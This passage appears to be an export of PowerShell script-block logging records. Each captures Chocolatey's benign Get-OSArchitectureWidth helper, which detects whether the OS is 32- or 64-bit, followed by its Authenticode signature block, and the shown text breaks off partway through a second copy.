$compare ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $bits = 64 if (([System.IntPtr]::Size -eq 4) -and (Test-Path env:\PROCESSOR_ARCHITEW6432)) { $bits = 64 } elseif ([System.IntPtr]::Size -eq 4) { $bits = 32 } # Return bool|int if (""$compare"" -ne '' -and $compare -eq $bits) { return $true } elseif (""$compare"" -ne '') { return $false } else { return $bits } } Set-Alias Get-ProcessorBits Get-OSArchitectureWidth Set-Alias Get-OSBitness Get-OSArchitectureWidth # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCC+5R24zufGXnsc # mWj/25mf6jwe97cvRY7+8fCOG4I2J6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgP758QKNsTW8rWPEwFItvwYU40LERXrsVnMIx # EW0I+YIwDQYJKoZIhvcNAQEBBQAEggEAnYGeuRcmWugYjQnOQJRgsG/fTDMry1sv # PxtTaoIGjlW8iPLJk58sQdyQxEfkcsNe58bwKnvB8B0kvMol/AES2Esz4QYX/A7Z # iXdB1XxsQVio7B8XsQdGmePNEeIda18ExPkIyDnKD2grpDiFz8vaQp8CsZZcfZzc # fbM5qcUF5HFCdTI4gFxb3NXduCk7mOIhDajJH4cVpdz0N1FfVuTR+sDErHUS72vd # BQtW/gOPSA0JIetcmJrqvRXdx3n0Sp32kBxn7XyypO1L3PxBgZwW94ekQDIe5v3F # SKlmv2E38T0tU5/IUX2PNV3vMKWHs3E7Me6r6+h1TcHeXhTrRrV586GCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU2WjAjBgkqhkiG9w0BCQQxFgQUQekAipyHZj/2ib13 # V41/KGW2HqcwDQYJKoZIhvcNAQEBBQAEggEAhdsnEFLCzzvdikeGGRpCELtJtKGY # dVO1NWtm4UqWDlCg6n+aWm0/81MWDOkyzeXzYuWeBK5dU2dvLrV3vtlKJvEDJ3p3 # caImQHht9OvP7kMWRJ9YuH5j+Hh2StWpsOxKWEQjUawkin2pJSOE7oFNte8rA0zB # fL9uclSP1n20elP+4Uf3NQASJdjcLypcwkOOk0D+mWjFI0eFTxc5WY6/u4u8hLZu # XS0q7rRIBi8wQgTtZQ63WQwkgl00kUpy1SdFehmRfbq2onSw8LbJQh6ZI/Gt477b # FWOp8lN75cQHTfqF31fPr/PDP0LPeVn0XKEsemZZEqhbWTQE/Pg4S+QHeA== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Get-OSArchitectureWidth.ps1 ¦ ScriptBlockId: 8c1443d1-9cd5-47a4-bc35-66af266fd217 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-OSArchitectureWidth { <# .SYNOPSIS Get the operating system architecture address width. .DESCRIPTION This will return the system architecture address width (probably 32 or 64 bit). If you pass a comparison, it will return true or false instead of {`32`|`64`}. .NOTES When your installation script has to know what architecture it is run on, this simple function comes in handy. Available as `Get-OSArchitectureWidth` in 0.9.10+. If you need compatibility with pre 0.9.10, please use the alias `Get-ProcessorBits`. .INPUTS None .OUTPUTS None .PARAMETER Compare This optional parameter causes the function to return $true or $false, depending on wether or not the bit width matches. #> param( $compare ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $bits = 64 if (([System.IntPtr]::Size -eq 4) -and (Test-Path env:\PROCESSOR_ARCHITEW6432)) { $bits = 64 } elseif ([System.IntPtr]::Size -eq 4) { $bits = 32 } # Return bool|int if (""$compare"" -ne '' -and $compare -eq $bits) { return $true } elseif (""$compare"" -ne '') { return $false } else { return $bits } } Set-Alias Get-ProcessorBits Get-OSArchitectureWidth Set-Alias Get-OSBitness Get-OSArchitectureWidth # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCC+5R24zufGXnsc # mWj/25mf6jwe97cvRY7+8fCOG4I2J6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # 